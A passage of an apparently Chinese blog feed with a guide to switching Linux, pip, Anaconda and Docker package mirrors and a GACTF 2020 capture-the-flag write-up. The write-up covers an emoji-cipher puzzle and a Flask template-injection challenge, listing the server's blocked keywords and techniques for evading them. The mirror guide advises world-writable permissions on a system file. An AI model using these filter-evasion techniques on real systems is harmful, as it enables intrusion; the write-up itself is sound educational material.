.forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>环境搭建之更换软件源汇总(Ubuntu/pip/Anaconda/Docker等)</title>
      <link href="/2020/09/25/Server_ChangeSource/"/>
      <url>/2020/09/25/Server_ChangeSource/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>众所周知，很多官方软件源默认都在国外，在国内下载不是一般的慢……</p><p>于是我们想到了通过国内的镜像站，来加速访问或下载等。</p><p>最近搭建环境，又折腾了一堆换源，于是又到处找觉得挺麻烦的。</p><p>正好这次就来汇总一下各种常用的换源好了。</p><br><hr><h2 id="系统-apt-换源"><a href="#系统-apt-换源" class="headerlink" title="系统 apt 换源"></a>系统 apt 换源</h2><p><strong>以 Ubuntu 为例：</strong></p><p>首先备份原文件</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</code></pre><p>（有可能需要修改文件权限为可编辑）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> 777 /etc/apt/sources.list</code></pre><p>而后编辑文件</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/apt/sources.list<span class="token comment" spellcheck="true"># 或 sudo gedit /etc/apt/sources.list</span></code></pre><p>都没有的话可以先装个编辑器，或者 </p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token keyword">echo</span> <span class="token string">"balabala"</span> <span class="token operator">></span> /etc/apt/sources.list</code></pre><p>其中的 <code>balabala</code> 是下面的内容。</p><h3 id="清华-tuna-源"><a href="#清华-tuna-源" class="headerlink" title="清华 tuna 源"></a>清华 tuna 源</h3><blockquote><p>详见 <a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p><p>本镜像仅包含 32/64 位 x86 架构处理器的软件包，在 ARM(arm64, armhf)、PowerPC(ppc64el)、RISC-V(riscv64) 和 S390x 等架构的设备上（对应官方源为ports.ubuntu.com）请使用 <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/" target="_blank" rel="noopener">ubuntu-ports 镜像</a>。</p></blockquote><h4 id="Ubuntu-18-04-LTS"><a href="#Ubuntu-18-04-LTS" class="headerlink" title="Ubuntu 18.04 LTS"></a>Ubuntu 18.04 LTS</h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><span class="token comment" spellcheck="true"># 预发布软件源，不建议启用</span><span class="token comment" spellcheck="true"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span></code></pre><h4 id="Ubuntu-16-04-LTS"><a href="#Ubuntu-16-04-LTS" class="headerlink" title="Ubuntu 16.04 LTS"></a>Ubuntu 16.04 LTS</h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><span class="token comment" spellcheck="true"># 预发布软件源，不建议启用</span><span class="token comment" spellcheck="true"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span><span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></code></pre><h4 id="Ubuntu-20-04-LTS"><a href="#Ubuntu-20-04-LTS" class="headerlink" title="Ubuntu 20.04 LTS"></a>Ubuntu 20.04 LTS</h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><span class="token comment" spellcheck="true"># 预发布软件源，不建议启用</span><span class="token comment" spellcheck="true"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse     </span></code></pre><h4 id="Ubuntu-Ports"><a href="#Ubuntu-Ports" class="headerlink" title="Ubuntu Ports"></a>Ubuntu Ports</h4><blockquote><p>本镜像仅包含 arm64 armhf ppc64el riscv64 s390x 架构的软件包。</p><p>（比如在 NVIDIA Jetson TX2 等嵌入式系统上跑的）</p></blockquote><p><strong>Ubuntu 18.04 LTS:</strong> </p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse<span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse</span><span class="token comment" spellcheck="true"># 预发布软件源，不建议启用</span><span class="token comment" spellcheck="true"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-proposed main restricted universe multiverse</span><span class="token comment" spellcheck="true"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-proposed main restricted universe multiverse</span></code></pre><p>其他版本也类似，加个 <code>/ubuntu-ports/</code> 即可。</p><h4 id="Alpine-Linux"><a href="#Alpine-Linux" class="headerlink" title="Alpine Linux"></a>Alpine Linux</h4><p>在终端执行下面的语句。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g'</span> /etc/apk/repositories</code></pre><h3 id="阿里源"><a href="#阿里源" class="headerlink" title="阿里源"></a>阿里源</h3><h4 id="Ubuntu-18-04-LTS-1"><a href="#Ubuntu-18-04-LTS-1" class="headerlink" title="Ubuntu 18.04 LTS"></a>Ubuntu 18.04 LTS</h4><pre class=" language-bash"><code class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</code></pre><h3 id="163源"><a href="#163源" class="headerlink" title="163源"></a>163源</h3><h4 id="Ubuntu-18-04-LTS-2"><a href="#Ubuntu-18-04-LTS-2" class="headerlink" title="Ubuntu 18.04 LTS"></a>Ubuntu 18.04 LTS</h4><pre class=" language-bash"><code class="language-bash">deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre><hr><p>换好源后更新源</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update</code></pre><p>修复损坏的软件包，尝试卸载出错的包，重新安装正确版本的。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> -f <span class="token function">install</span></code></pre><p>更新软件</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade</code></pre><p>或者安装软件……</p><hr><h2 id="Pypi-pip-换源"><a href="#Pypi-pip-换源" class="headerlink" title="Pypi (pip) 换源"></a>Pypi (pip) 换源</h2><h3 id="清华-tuna-源-1"><a href="#清华-tuna-源-1" class="headerlink" title="清华 tuna 源"></a>清华 tuna 源</h3><p><strong>临时安装时：</strong></p><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> -i https://pypi.tuna.tsinghua.edu.cn/simple some-package</code></pre><p><code>some-package</code> 为模块名。</p><p><strong>设为默认：</strong></p><pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> -i https://pypi.tuna.tsinghua.edu.cn/simple pip -Upip config <span class="token keyword">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</code></pre><p><strong>或者</strong>，Linux 或 MacOS 下修改 <code>~/.pip/pip.conf</code>，若没有此文件则创建一个新的。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">mkdir</span> ~/.pip<span class="token function">cd</span> ~/.pipvim pip.conf</code></pre><p>Windows 下：</p><blockquote><ol><li>文件管理器文件路径地址栏敲：<code>%HOMEPATH%</code> 回车，快速进入 <code>C:\Users\用户名\</code> 文件夹中（用户目录）</li><li>新建 <code>pip</code> 文件夹并在文件夹中新建 <code>pip.ini</code> 配置文件</li><li>新增 <code>pip.ini</code> 配置文件内容 </li></ol></blockquote><p>文件内容如下。</p><pre class=" language-ini"><code class="language-ini"><span class="token selector">[global]</span><span class="token constant">index-url</span> <span class="token attr-value"><span class="token punctuation">=</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><span class="token selector">[install]</span><span class="token constant">use-mirrors</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span><span class="token constant">mirrors</span> <span class="token attr-value"><span class="token punctuation">=</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><span class="token constant">trusted-host</span> <span class="token attr-value"><span class="token punctuation">=</span> pypi.tuna.tsinghua.edu.cn</span></code></pre><h3 id="其他源"><a href="#其他源" class="headerlink" title="其他源"></a>其他源</h3><blockquote><ul><li>清华：<a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a></li><li>阿里云：<a href="https://mirrors.aliyun.com/pypi/simple" target="_blank" rel="noopener">https://mirrors.aliyun.com/pypi/simple</a></li><li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple" target="_blank" rel="noopener">https://pypi.mirrors.ustc.edu.cn/simple</a></li><li>豆瓣：<a href="https://pypi.douban.com/simple/" target="_blank" rel="noopener">https://pypi.douban.com/simple/</a></li></ul></blockquote><hr><h2 id="Anaconda-换源"><a href="#Anaconda-换源" class="headerlink" title="Anaconda 换源"></a>Anaconda 换源</h2><blockquote><p>参考 <a href="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/</a></p></blockquote><p>Anaconda 安装包可以到 <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/</a> 下载。</p><p>TUNA 还提供了 Anaconda 仓库与第三方源（conda-forge、msys2、pytorch等，<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/" target="_blank" rel="noopener">查看完整列表</a>）的镜像，各系统都可以通过修改用户目录下的 <code>.condarc</code> 文件。Windows 用户无法直接创建名为 <code>.condarc</code> 的文件，可先执行 <code>conda config --set show_channel_urls yes</code> 生成该文件之后再修改。</p><pre><code>channels:  - defaultsshow_channel_urls: truechannel_alias: https://mirrors.tuna.tsinghua.edu.cn/anacondadefault_channels:  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2custom_channels:  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</code></pre><p>即可添加 Anaconda Python 免费仓库。</p><p>运行 <code>conda clean -i</code> 清除索引缓存，保证用的是镜像站提供的索引。</p><p>运行 <code>conda create -n myenv numpy</code> 测试一下吧。</p><p><strong>或者</strong></p><pre class=" language-bash"><code class="language-bash">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/<span class="token comment" spellcheck="true"># 设置搜索时显示通道地址</span>conda config --set show_channel_urls <span class="token function">yes</span></code></pre><p>conda 额外库：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># pytorch</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/<span class="token comment" spellcheck="true"># 安装时PyTorch，官网给的安装命令需要去掉最后的-c pytorch，才能使用清华源</span><span class="token comment" spellcheck="true"># conda-forge</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/<span class="token comment" spellcheck="true"># msys2</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/<span class="token comment" spellcheck="true"># bioconda</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/<span class="token comment" spellcheck="true"># menpo</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/<span class="token comment" spellcheck="true"># 设置搜索时显示通道地址</span>conda config --set show_channel_urls <span class="token function">yes</span></code></pre><hr><h2 id="Docker-换源"><a href="#Docker-换源" class="headerlink" title="Docker 换源"></a>Docker 换源</h2><blockquote><p>参考之前写的 <a href="https://miaotony.xyz/2020/02/02/Server_Docker/#%E6%8D%A2%E6%BA%90">Docker 安装及常用命令</a>。</p></blockquote><h3 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h3><p>Linux 下，编辑此文件，如果没有则新建。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/docker/daemon.json</code></pre><p>Windows 下文件为</p><pre><code>%programdata%\docker\config\daemon.json</code></pre><p>内容可以为多个镜像</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>    <span class="token string">"https://dockerhub.azk8s.cn/"</span><span class="token punctuation">,</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="配置完之后重启服务"><a href="#配置完之后重启服务" class="headerlink" title="配置完之后重启服务"></a>配置完之后重启服务</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker</code></pre><h3 id="检查是否生效"><a href="#检查是否生效" class="headerlink" title="检查是否生效"></a>检查是否生效</h3><pre class=" language-bash"><code class="language-bash">docker info</code></pre><p>看最后的 Registry Mirrors 里有没有添加成功。</p><hr><p>大概就先收集这么多吧（</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> 换源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 GACTF 一点点WriteUp</title>
      <link href="/2020/08/31/CTF_2020GACTF/"/>
      <url>/2020/08/31/CTF_2020GACTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/08/31/CTF_2020GACTF/d7499bfe36874a5aaa7c76c413991efb.jpg" alt=""></p><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>这几天有个 GACTF，本来这几天有点事情没打算来看的，结果队里师傅突然扔来个代码，还以为是帮 debug，后来才发现是个 CTF 题目。。<em>（坏耶</em></p><p>于是随意来看看题目了，就佛系做了几个题嘤嘤嘤，顺便来学点东西就是了。</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="crymisc"><a href="#crymisc" class="headerlink" title="crymisc"></a>crymisc</h3><blockquote><p>8.25 is Chinese Valentine’s Day.Yesterday my brother told me he was  refused by a beautiful girl.He was sooooooooooooo sad and bursted into  tears.<br>链接：<a href="https://pan.baidu.com/s/1EZzhnAa5Q4OD8y-YEAcjzQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1EZzhnAa5Q4OD8y-YEAcjzQ</a><br>提取码：866h<br><a href="https://drive.google.com/drive/folders/1gDfMBrtqwvi7f9BaB1ixjogeLDascjED?usp=sharing" target="_blank" rel="noopener">https://drive.google.com/drive/folders/1gDfMBrtqwvi7f9BaB1ixjogeLDascjED?usp=sharing</a></p></blockquote><p>下载下来一个 <code>crymisc.docx</code>，一看打不开果然改成 zip，发现有伪加密。</p><p><code>1.txt</code> 内容为：</p><pre><code>I'm going to tell her how i feel.DO YOU WANT TO KNOW WHAT I TOLD HER?</code></pre><p>另外是一张图片，发现结尾有东西，至少有个压缩包。</p><p><img src="/2020/08/31/CTF_2020GACTF/3.jpg" alt="3"></p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830160506078.png" alt="3.jpg"></p><p>提取出来。</p><pre><code>SSB3YXMgcmVqZWN0ZWQuLi4uLi5USElTIElTIFRIRSBQQVNTV09SRDpJIFdhbm5hIENyeXl5ISEh</code></pre><p>首先对上面这段 base64，得到压缩包密码。</p><pre><code>I was rejected......THIS IS THE PASSWORD:I Wanna Cryyy!!!</code></pre><p>压缩包需要先补上文件头，即变成 504B0304…</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830160819061.png" alt="zip"></p><p>拿密码去解压，文件内容如下。</p><pre><code>🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕That is what i told her↑↑↑</code></pre><p><strong>什么，您就是抽象带师？</strong></p><p>想起来在 BJD3rd 里 TaQini 师傅就出过一题，就是 <a href="https://miaotony.xyz/2020/05/24/CTF_BJDCTF3rd/#manual">Manual 这题的一部分</a>。</p><p>参考<a href="https://miaotony.xyz/2020/05/24/CTF_BJDCTF3rd/#manual">那题的思路</a>，盲猜就是 Codemoji 了！根据提示key应该就是个哭的表情吧，就😭这个了。</p><blockquote><p>P.S.: <strong><a href="https://github.com/mozilla/codemoji" target="_blank" rel="noopener">codemoji GitHub repo</a></strong>     (Mozilla Public License 2.0)</p></blockquote><p>好耶，咱也部署一个！</p><p><strong>就在这里了！</strong>-&gt; <a href="https://codemoji.miaotony.xyz" target="_blank" rel="noopener">https://codemoji.miaotony.xyz</a></p><p><em>欢迎来玩呀（</em></p><p>于是构造 payload 如下：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"message"</span><span class="token operator">:</span><span class="token string">"🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕"</span><span class="token punctuation">,</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"😭"</span><span class="token punctuation">}</span></code></pre><p>base64encode + URLencode：</p><pre><code>eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D</code></pre><p>而后丢去解密。</p><p><a href="https://codemoji.miaotony.xyz/share.html?data=eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D" target="_blank" rel="noopener">https://codemoji.miaotony.xyz/share.html?data=eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D</a></p><p>得到flag。</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830161359128.png" alt="flag"></p><pre><code>WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe}</code></pre><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h3><blockquote><p>题目每10分钟重启，如遇到无法连接，请稍等片刻10秒左右会全部重启完毕<br> This topic restart every 10 minitues. If you can’t connect, please wait  for a while and the restart will be completed. Do not panic</p><p>China：<br> 124.70.153.63 80-89<br> Overseas：<br> 149.28.80.82 80-89</p></blockquote><p>POST 访问，提示 <code>request.form["name"]</code>。</p><p>带上参数 <code>name</code>，尝试 <strong>SSTI</strong>，发现有戏。</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830153912966.png" alt="SSTI_test"></p><p>某次利用报错看到了部分源码。</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830153448394.png" alt="source"></p><p>除了过滤了<code>flag</code>，在这个<code>check</code>函数里还过滤了许多，尝试发现，包括但不限于 os, system, pwd, popen, eval, import, request, mro, <code>'</code>, <code>%</code>,  <code>+</code>, <code>,</code>, <code></code>（空格）, <code>|</code>, <code>\x</code> 等等关键字或符号都被滤掉了……</p><p>单引号不行，但双引号可行，发现利用 <code>"op""en"</code> 的形式拼接字符串可行。</p><p>本来想找 PIN 的，但试了试所需的信息整不来（好菜啊），可以参考 <a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">Flask debug pin安全问题</a> 这一篇文章。</p><p>于是又整了半天绕过……</p><p>首先拿到 <code>object</code>。</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830154728511.png" alt="object"></p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155651157.png" alt="subclasses"></p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155727553.png" alt="globals"></p><p>一顿操作拿到 <code>__builtins__</code>。</p><p>发现<code>chr</code>之类的函数并没有，然而并不能用 <code>{% xxx %}</code> 来设置就很难受。</p><p><img src="/2020/08/31/CTF_2020GACTF/image-20200830155031718.png" alt="__builtins__"></p><p>本来想用 <code>os.popen</code> 